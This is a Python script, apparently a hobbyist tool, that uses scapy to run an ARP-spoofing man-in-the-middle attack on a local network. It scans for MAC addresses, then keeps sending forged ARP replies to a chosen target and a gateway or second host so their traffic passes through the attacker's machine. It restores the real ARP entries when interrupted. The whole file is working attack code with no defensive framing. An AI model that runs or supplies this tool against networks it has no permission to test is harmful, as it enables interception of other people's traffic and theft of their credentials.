"""Man in The Middle."""
# echo 1 >  /proc/sys/net/ipv4/ip_forward
import argparse
import time

from scapy.all import *


def get_user_params():
    """Get User paramaters."""
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ipaddress', dest='ipaddress', help='Enter ip address or Net')
    parser.add_argument('-t', '--target', dest='targetip', help='Enter target address or Net')
    parser.add_argument('-p', '--poison', dest='poisonip', help='Enter poison ip address or Net')
    result = parser.parse_args()
    return result


def get_scan_mac(ipornet, onlyone=False, shell=False, summary=False):
    arp = ARP(pdst=ipornet)
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether / arp
    rcvList, plist = srp(packet, timeout=10, verbose=shell)
    if summary: rcvList.summary()
    if onlyone: return rcvList[0][1].src
    return None


def get_mac(ip):
    return get_scan_mac(ip, onlyone=True)


my_mac = target_mac = poison_mac = None


def set_poison(targetip, poisonip, shell=False, reset=False):
    global my_mac, target_mac, poison_mac
    if not my_mac: my_mac = get_if_hwaddr(conf.iface)
    if not target_mac: target_mac = get_mac(targetip)
    if not poison_mac: poison_mac = get_mac(poisonip)
    arp = ARP(hwsrc=target_mac if reset else my_mac, psrc=targetip, hwdst=poison_mac, pdst=poisonip)
    plist = send(arp, verbose=shell,count=4)


args = get_user_params()

if args.targetip and args.poisonip:
    poison_packet_counter = 0
    try:

        while True:
            set_poison(args.targetip, args.poisonip)
            set_poison(args.poisonip, args.targetip)
            poison_packet_counter += 1
            print('\rPoison packet sended ' + str(poison_packet_counter), end="")
            time.sleep(3)
    except KeyboardInterrupt:
        set_poison(args.targetip, args.poisonip, reset=True)
        set_poison(args.poisonip, args.targetip, reset=True)
        print('\nPoison Reset.')
        print("Programdan çıkılıyor.")
elif args.ipaddress:
    get_scan_mac(args.ipaddress, shell=True, summary=True)
else:
    print("for help parameters : --help")
